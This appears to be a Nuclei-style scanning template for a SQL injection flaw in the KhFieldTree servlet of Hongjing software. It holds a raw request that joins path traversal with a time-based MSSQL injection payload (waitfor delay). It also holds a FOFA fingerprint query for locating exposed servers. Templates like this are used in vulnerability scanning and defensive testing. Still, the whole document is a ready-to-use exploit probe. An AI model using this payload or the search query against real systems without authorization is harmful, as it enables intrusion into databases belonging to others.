id: hongjing-khfieldtree-sqli
info:
  name: khfieldtree-sqli
  author: msksec
  severity: high
  description: hongjing
  metadata: 
    fofa-query: icon_hash="947874108",body='<div class="hj-hy-all-one-logo"'
  reference: hongjing
requests:
  - raw:
      - |
        GET /templates/attestation/.%2e/.%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=1';waitfor+delay+'0:0:5'+-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200'
          - 'duration_1 > 5'
        condition: and




        